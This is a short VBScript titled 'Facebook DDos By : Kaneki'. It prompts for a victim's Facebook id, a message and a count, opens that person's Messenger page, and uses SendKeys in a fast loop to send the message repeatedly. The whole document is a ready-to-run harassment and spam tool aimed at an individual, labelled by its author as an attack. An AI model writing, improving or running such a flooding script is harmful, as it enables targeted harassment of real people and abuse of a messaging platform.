' InputBoxes
id = InputBox("What is the id of the victim?", "Facebook DDos By : Kaneki")
Message = InputBox("What is the message to send?","Facebook DDos By : Kaneki")
T = InputBox("How many times does the message need to be sent?","Facebook DDos By : Kaneki")
If MsgBox("You filled everything correctly", 1024 + vbSystemModal, "Facebook DDos By : Kaneki") = vbOk Then

' Go To facebook messages
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run("https://www.facebook.com/messages/"+ id)

' Loading Time

If MsgBox("O facebook is open?" & vbNewLine & vbNewLine & "Press No to cancel", vbYesNo + vbQuestion + vbSystemModal, "Facebook DDos By : Kaneki") = vbYes Then

' The Loop For The Messages
For i = 0 to T
WScript.Sleep 10
WshShell.SendKeys Message
WScript.Sleep 10
WshShell.SendKeys "{ENTER}"
Next

' End Of The Script
WScript.Sleep 3000
MsgBox "DDosing no " + Contact + " Was successfully done", 1024 + vbSystemModal, "DDos feito"

' Canceled Script
Else
MsgBox "Process was successfully canceled", vbSystemModal, "DDos Canceled"
End If
Else
End If
